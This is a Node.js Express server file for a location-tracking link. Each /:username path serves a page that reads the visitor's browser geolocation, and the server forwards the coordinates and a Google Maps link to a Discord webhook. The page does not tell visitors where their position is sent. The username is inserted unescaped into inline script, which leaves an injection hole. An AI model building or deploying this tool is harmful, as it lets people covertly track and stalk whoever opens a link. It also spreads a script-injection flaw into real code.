require("dotenv").config();
const express = require("express");
const app = express();
const bp = require("body-parser");
const cors = require("cors");
const path = require("path");
const fs = require("fs");
const axios = require("axios"); // For sending data to Discord

app.use(express.json());
app.use(bp.json());
app.use(bp.urlencoded({ extended: true }));
app.use(
  cors({
    origin: "*", // Allow any origin
    methods: ["GET", "POST"], // Allow specific HTTP methods
    allowedHeaders: ["Content-Type"], // Allow specific headers
  })
);  

// Discord Webhook URL (Add it in your .env file as DISCORD_WEBHOOK)
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK;

// Ping route
app.get("/ping", (req, res) => {
  res.status(200).send({
    message: "Hello world",
    status: "OK",
    timestamp: new Date().toISOString(),
  });
});

// Route for username and location tracking
app.get("/:username", (req, res) => {
  const username = req.params.username;

  const clientSideScript = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Send Location</title>
      <script>
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            // Send location data to the server
            await fetch("/sendLocation", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                username: "${username}",
                latitude,
                longitude,
              }),
            });
          },
          (error) => {
            console.error("Error getting location:", error);
          }
        );
      </script>
    </head>
    <body>
      <h1>Fetching your location...</h1>
    </body>
    </html>
  `;

  res.send(clientSideScript);
}); 

// Handle location data and send to Discord
app.post("/sendLocation", async (req, res) => {
  const { username, latitude, longitude } = req.body;

  if (!username || !latitude || !longitude) {
    return res.status(400).send("Missing data");
  } 

  try {
    // Send location details to Discord
    await axios.post(DISCORD_WEBHOOK_URL, {
      content: `**New Location Update**\n\n**Username:** ${username}\n**Latitude:** ${latitude}\n**Longitude:** ${longitude}\n[View on Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`,
    });

    res.status(200).send("Location sent to Discord!");
  } catch (error) {
    console.error("Error sending to Discord:", error.message);
    res.status(500).send("Failed to send location to Discord");
  }
});

// Handle undefined routes
app.get("*", (req, res) =>
  res.status(404).json({
    error: "Not Found",
    message: "The requested API route does not exist.",
  })
);

app.post("*", (req, res) =>
  res.status(404).json({
    error: "Not Found",
    message: "The requested API route does not exist.",
  })
);

// Start the server
app.listen(3003, () => console.log("Server ready on port 3003."));

module.exports = app;
